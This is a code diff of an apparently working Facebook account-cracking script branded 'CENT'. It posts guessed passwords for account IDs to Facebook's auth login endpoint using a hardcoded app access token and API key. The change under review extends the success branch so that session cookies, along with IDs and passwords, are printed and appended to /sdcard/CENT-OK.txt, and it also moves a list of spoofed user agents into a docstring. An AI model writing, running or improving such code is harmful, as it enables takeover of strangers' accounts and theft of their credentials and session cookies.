@@ -82,7 +82,7 @@ logo= f'''
 {W}██         ██         ██ █   ██      ███    
 {W}██         ████████   ██  █  ██      ███    
 {W}██         ██         ██   █ ██      ███    
-{W}█████████  █████████  ██    ███      ███     
+{W}█████████  █████████  ██    ███      ███    
 \033[1;93m==================================================
 \033[1;97m Owner : CENT
 \033[1;97m Facebook : CenT
@@ -211,28 +211,29 @@ def pak():
 
 
 ####@-----UserAgent----@####
+"""
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3360038809 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v9946691043 t2359546008474051152 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v1293053146466352222 t4418554050904986715 ath1fb31b7a altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v8702605039731550882 t8360729428027585528 ath259cea6f altpriv cvcv=2 smf=0
+Mozilla/5.0 (Linux; Android 7.1.1; N9560 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v5436392744083573770 t6315332425969305434 ath259cea6f altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v4545621359653455873 t7257912775283346076 ath5ee645e0 altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v2894625283128232269 t6315332425969305434 ath259cea6f altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v5494699589149184143 t7257912775283346076 ath5ee645e0 altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3360166407 t3176537711211975202 athfa3c3975 altpub cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3360166405 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v5410955731649432201 t8056460500199558789 ath5ee645e0 altpriv cvcv=2 smf=0
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v8223426225533733795 t331183210298792754 ath1fb31b7a altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v9947176573 t2359546008474051152 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3360178946 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v5291232599499729713 t4763100215355965436 ath259cea6f altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v3317947955324566861 t8360729428027585528 ath259cea6f altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4000966587464841291 t5747064355914000718 ath259cea6f altpriv cvcv=2 smf=0
+Mozilla/5.0 (Linux; Android 8.1.0; DUA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 6.0; E5533) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36
 
-"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3360038809 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0"
-"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v9946691043 t2359546008474051152 athfa3c3975 altpub cvcv=2 smf=0 svfu=1"
-"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v1293053146466352222 t4418554050904986715 ath1fb31b7a altpriv cvcv=2 smf=0"
-"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v8702605039731550882 t8360729428027585528 ath259cea6f altpriv cvcv=2 smf=0"
-"Mozilla/5.0 (Linux; Android 7.1.1; N9560 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]"
-"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v5436392744083573770 t6315332425969305434 ath259cea6f altpriv cvcv=2 smf=0"
-"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v4545621359653455873 t7257912775283346076 ath5ee645e0 altpriv cvcv=2 smf=0"
-"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v2894625283128232269 t6315332425969305434 ath259cea6f altpriv cvcv=2 smf=0"
-"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v5494699589149184143 t7257912775283346076 ath5ee645e0 altpriv cvcv=2 smf=0"
-"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3360166407 t3176537711211975202 athfa3c3975 altpub cvcv=2 smf=0"
-"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3360166405 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0"
-"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v5410955731649432201 t8056460500199558789 ath5ee645e0 altpriv cvcv=2 smf=0"
-"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v8223426225533733795 t331183210298792754 ath1fb31b7a altpriv cvcv=2 smf=0"
-"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v9947176573 t2359546008474051152 athfa3c3975 altpub cvcv=2 smf=0 svfu=1"
-"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3360178946 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0"
-"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v5291232599499729713 t4763100215355965436 ath259cea6f altpriv cvcv=2 smf=0"
-"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v3317947955324566861 t8360729428027585528 ath259cea6f altpriv cvcv=2 smf=0"
-"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4000966587464841291 t5747064355914000718 ath259cea6f altpriv cvcv=2 smf=0"
-"Mozilla/5.0 (Linux; Android 8.1.0; DUA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36"
-"Mozilla/5.0 (Linux; Android 6.0; E5533) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36"
-
+"""
 ####@-----FileM-----@####
 
 
@@ -293,8 +294,8 @@ def method():
             print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m[\033[1;97mCENT-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
-                open('/sdcard/CENT-OK.txt','a').write(f'{acc} • {pword}\n')
+                print('\r\033[1;92m[\033[1;97mCENT-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'\033[1;92m•\033[1;97m '+cookies+'')
+                open('/sdcard/CENT-OK.txt','a').write(f'{acc} • {pword} • {cookies}\n')
                 if c=='y':
                     try:
                            q = json.loads(response.text)
@@ -437,7 +438,7 @@ def andom():
             pword = pword.lower()
             data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
             response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
-            print(response.text)
+      #      print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
                 print('\r\033[1;92m[\033[1;97mCENT-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
